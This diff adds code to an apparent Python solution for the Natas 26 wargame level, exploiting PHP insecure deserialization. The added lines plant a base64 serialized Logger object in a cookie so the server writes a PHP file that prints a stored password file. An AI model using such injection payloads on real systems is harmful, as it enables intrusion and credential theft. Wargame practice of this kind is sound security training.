@@ -81,3 +81,12 @@ $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
 # usually, __destruct() is used for garbage collection, in this case,
 # however, it is used to write an exit message
 # therefore, we can use __destruct to write the password of natas27 to a file in the img directory
+
+
+# we can serialize the Logger object by running serialize.php
+# set the cookies
+cookies_dict = session.cookies.get_dict()
+cookies_dict["drawing"] = "Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyNToiaW1nL3Bhc3N3b3Jkb2ZuYXRhczI3LnBocCI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjU4OiI8PyBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNicpID8%2BIjt9"
+# create a new cookiejar for the session
+session.cookies.clear()
+requests.utils.cookiejar_from_dict(cookies_dict, session.cookies)
